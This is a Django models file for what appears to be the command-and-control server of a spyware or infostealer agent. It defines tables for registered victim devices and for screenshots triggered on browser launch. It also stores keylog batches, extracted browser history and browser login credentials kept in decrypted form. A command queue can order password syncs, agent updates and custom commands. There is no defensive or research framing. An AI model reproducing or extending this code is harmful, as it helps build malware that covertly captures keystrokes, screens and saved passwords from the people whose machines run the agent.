"""
Database models for the Controller Agent API.
Handles devices, configs, files, screenshots, keylogs, and commands.
"""

import secrets
import uuid
from django.db import models
from django.utils import timezone


def generate_token():
    """Generate a secure random token for device authentication."""
    return secrets.token_urlsafe(32)


class Device(models.Model):
    """Registered device/agent with authentication and status tracking."""
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    hardware_id = models.CharField(max_length=255, unique=True, db_index=True)
    hostname = models.CharField(max_length=255)
    token = models.CharField(max_length=64, default=generate_token, unique=True)
    
    # Status tracking
    is_active = models.BooleanField(default=True)
    last_seen = models.DateTimeField(auto_now=True)
    registered_at = models.DateTimeField(auto_now_add=True)
    
    # System info (optional, populated by agent)
    os_version = models.CharField(max_length=100, blank=True)
    agent_version = models.CharField(max_length=20, blank=True)
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    
    class Meta:
        ordering = ['-last_seen']
    
    def __str__(self):
        return f"{self.hostname} ({self.hardware_id[:8]}...)"
    
    def regenerate_token(self):
        """Generate a new authentication token."""
        self.token = generate_token()
        self.save(update_fields=['token'])
        return self.token
    
    @property
    def device_id(self):
        """Return device ID as string for URL compatibility."""
        return str(self.id)
    
    @property
    def is_authenticated(self):
        """For DRF authentication compatibility."""
        return True


class DeviceConfig(models.Model):
    """Per-device configuration and feature toggles."""
    
    device = models.OneToOneField(
        Device, 
        on_delete=models.CASCADE, 
        related_name='config'
    )
    
    # Master kill switch - disables ALL features except config sync
    kill_switch = models.BooleanField(default=False)
    
    # Feature toggles (all disabled by default)
    screenshots_enabled = models.BooleanField(default=False)
    keylogger_enabled = models.BooleanField(default=False)
    browser_triggers_enabled = models.BooleanField(default=False)
    file_upload_enabled = models.BooleanField(default=False)
    browser_data_enabled = models.BooleanField(default=False)
    
    # Intervals (in seconds)
    config_sync_interval = models.IntegerField(default=900)  # 15 minutes
    keylog_sync_interval = models.IntegerField(default=300)  # 5 minutes
    browser_history_sync_interval = models.IntegerField(default=14400) # 4 hours
    
    screenshot_quality = models.IntegerField(default=75)  # JPEG quality 1-100
    
    # Browser list for auto-screenshot triggers
    monitored_browsers = models.JSONField(
        default=list,
        help_text="List of browser process names to monitor"
    )
    
    updated_at = models.DateTimeField(auto_now=True)
    
    class Meta:
        verbose_name = "Device Configuration"
        verbose_name_plural = "Device Configurations"
    
    def __str__(self):
        return f"Config for {self.device.hostname}"
    
    def save(self, *args, **kwargs):
        # Set default monitored browsers if empty
        if not self.monitored_browsers:
            self.monitored_browsers = [
                'chrome.exe', 'firefox.exe', 'msedge.exe',
                'brave.exe', 'opera.exe', 'iexplore.exe'
            ]
        super().save(*args, **kwargs)


class FileMetadata(models.Model):
    """Metadata for files uploaded to Cloudinary."""
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(
        Device, 
        on_delete=models.CASCADE, 
        related_name='files'
    )
    
    # Cloudinary data
    public_id = models.CharField(max_length=255, unique=True)
    secure_url = models.URLField(max_length=500)
    resource_type = models.CharField(max_length=20)  # image, raw, video
    format = models.CharField(max_length=20)
    size_bytes = models.BigIntegerField()
    
    # Metadata
    original_filename = models.CharField(max_length=255, blank=True)
    file_type = models.CharField(max_length=50)  # screenshot, keylog, document, etc.
    
    created_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-created_at']
        verbose_name = "File Metadata"
        verbose_name_plural = "File Metadata"
    
    def __str__(self):
        return f"{self.file_type}: {self.original_filename or self.public_id}"


class ScreenshotMeta(models.Model):
    """Screenshot-specific metadata with additional context."""
    
    TRIGGER_CHOICES = [
        ('manual', 'Manual/On-Demand'),
        ('browser', 'Browser Launch'),
        ('scheduled', 'Scheduled'),
        ('command', 'Server Command'),
    ]
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(
        Device, 
        on_delete=models.CASCADE, 
        related_name='screenshots'
    )
    file_metadata = models.OneToOneField(
        FileMetadata,
        on_delete=models.CASCADE,
        related_name='screenshot_info',
        null=True,
        blank=True
    )
    
    # Cloudinary data (duplicated for quick access)
    secure_url = models.URLField(max_length=500)
    public_id = models.CharField(max_length=255)
    
    # Screenshot context
    trigger_type = models.CharField(max_length=20, choices=TRIGGER_CHOICES)
    active_window_title = models.CharField(max_length=500, blank=True)
    active_process = models.CharField(max_length=100, blank=True)
    
    # Display info
    screen_width = models.IntegerField(null=True)
    screen_height = models.IntegerField(null=True)
    
    captured_at = models.DateTimeField()
    received_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-captured_at']
        verbose_name = "Screenshot"
        verbose_name_plural = "Screenshots"
    
    def __str__(self):
        return f"Screenshot from {self.device.hostname} at {self.captured_at}"


class KeylogData(models.Model):
    """Batched keylog data from devices."""
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(
        Device, 
        on_delete=models.CASCADE, 
        related_name='keylogs'
    )
    
    # Keylog content
    data = models.TextField()  # The actual keylog text
    
    # Timing
    start_time = models.DateTimeField()
    end_time = models.DateTimeField()
    
    # Metadata
    character_count = models.IntegerField(default=0)
    window_switches = models.IntegerField(default=0)
    
    received_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-end_time']
        verbose_name = "Keylog Data"
        verbose_name_plural = "Keylog Data"
    
    def __str__(self):
        return f"Keylog from {self.device.hostname}: {self.start_time} to {self.end_time}"


class BrowserHistory(models.Model):
    """Browsing history extracted from devices."""
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(
        Device, 
        on_delete=models.CASCADE, 
        related_name='browser_history'
    )
    
    url = models.TextField()
    title = models.CharField(max_length=500, blank=True)
    visit_count = models.IntegerField(default=1)
    last_visit_time = models.DateTimeField()
    browser_type = models.CharField(max_length=50, blank=True) # Chrome, Edge, etc.
    
    received_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-last_visit_time']
        verbose_name_plural = "Browser History"
        
    def __str__(self):
        return f"{self.device.hostname}: {self.url[:50]}"


# BrowserCookie model removed


class BrowserCredential(models.Model):
    """Decrypted login credentials extracted from devices."""
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(
        Device, 
        on_delete=models.CASCADE, 
        related_name='browser_credentials'
    )
    
    origin_url = models.TextField()
    action_url = models.TextField(blank=True, null=True)
    username_element = models.CharField(max_length=255, blank=True)
    username_value = models.CharField(max_length=255, blank=True, null=True)
    password_element = models.CharField(max_length=255, blank=True)
    password_value = models.CharField(max_length=255) # Stored decrypted
    
    browser_type = models.CharField(max_length=50, blank=True)
    created_at_browser = models.DateTimeField(null=True, blank=True)
    
    received_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-received_at']
        
    def __str__(self):
        return f"{self.device.hostname}: {self.origin_url} ({self.username_value})"


class Command(models.Model):
    """Command queue for server-to-agent communication."""
    
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('delivered', 'Delivered'),
        ('acknowledged', 'Acknowledged'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
        ('expired', 'Expired'),
    ]
    
    COMMAND_TYPES = [
        ('screenshot', 'Take Screenshot'),
        ('config_refresh', 'Refresh Configuration'),
        ('keylog_sync', 'Sync Keylogs Now'),
        ('browser_sync', 'Sync Browser Data'),
        ('browser_history_sync', 'Sync History Only'),
        ('browser_credential_sync', 'Sync Passwords Only'),
        # ('browser_cookie_sync', 'Sync Cookies Only'),
        ('update_agent', 'Update Agent'),
        ('restart_agent', 'Restart Agent'),
        ('custom', 'Custom Command'),
    ]
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    device = models.ForeignKey(
        Device, 
        on_delete=models.CASCADE, 
        related_name='commands'
    )
    
    command_type = models.CharField(max_length=30, choices=COMMAND_TYPES)
    payload = models.JSONField(default=dict, blank=True)
    
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    
    # Timing
    created_at = models.DateTimeField(auto_now_add=True)
    delivered_at = models.DateTimeField(null=True, blank=True)
    completed_at = models.DateTimeField(null=True, blank=True)
    expires_at = models.DateTimeField(null=True, blank=True)
    
    # Result
    result = models.JSONField(default=dict, blank=True)
    error_message = models.TextField(blank=True)
    
    class Meta:
        ordering = ['-created_at']
    
    def __str__(self):
        return f"{self.command_type} for {self.device.hostname} ({self.status})"
    
    def mark_delivered(self):
        """Mark command as delivered to agent."""
        self.status = 'delivered'
        self.delivered_at = timezone.now()
        self.save(update_fields=['status', 'delivered_at'])
    
    def mark_completed(self, result=None):
        """Mark command as successfully completed."""
        self.status = 'completed'
        self.completed_at = timezone.now()
        if result:
            self.result = result
        self.save(update_fields=['status', 'completed_at', 'result'])
    
    def mark_failed(self, error_message):
        """Mark command as failed."""
        self.status = 'failed'
        self.completed_at = timezone.now()
        self.error_message = error_message
        self.save(update_fields=['status', 'completed_at', 'error_message'])
